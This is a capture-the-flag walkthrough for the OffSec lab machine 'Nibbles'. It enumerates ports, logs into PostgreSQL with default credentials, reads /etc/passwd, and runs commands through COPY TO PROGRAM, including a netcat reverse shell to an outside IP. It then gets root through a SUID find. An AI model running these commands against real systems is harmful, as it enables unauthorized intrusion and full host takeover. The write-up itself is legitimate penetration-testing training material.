# Nibbles

## Intro

Nibbles is a 'get to work' intermediate linux machine from offsec proving grounds.  

## Enum

### Nmap

All tcp ports.  

```
21/tcp   open   ftp          syn-ack ttl 61 vsftpd 3.0.3
22/tcp   open   ssh          syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open   http         syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
139/tcp  closed netbios-ssn  reset ttl 61
445/tcp  closed microsoft-ds reset ttl 61
5437/tcp open   postgresql   syn-ack ttl 61 PostgreSQL DB 11.3 - 11.9
```

## postgresql

Login details for default user.  

`psql -U postgres -h 192.168.184.47 -p 5437 --password postgres`


As postgres user is superadmin, the following roles can be granted to access the file system.

```
GRANT pg_read_server_files TO "postgres";

GRANT pg_write_server_files TO "postgres";

GRANT pg_execute_server_program TO "postgres";
```

Reading files from the file system.  

```
CREATE TABLE demo(t text);

COPY demo FROM '/etc/passwd';

SELECT * FROM demo;
```

The following users have a login shell.  

```
root:x:0:0:root:/root:/bin/bash
wilson:x:1000:1000:wilson,,,:/home/wilson:/bin/bash
postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

List directories, first change to postgres database.  

```
\c postgres

SELECT * FROM pg_ls_dir('/var/www/html');
```

Execute a program.  

```
copy (select '') into program 'curl http://<ip>';
```


## User shell

Netcat is located in the /bin drive of the machine.

Set up a listener.  

```
nc -lvnp 80
```

Return a shell back.  

```
copy (select '') to program '/bin/nc -e /bin/bash 192.168.45.194 80';
```

## Root

The find command has SUID.  

```
/usr/bin/find . -exec /bin/sh -p \; -quit
```
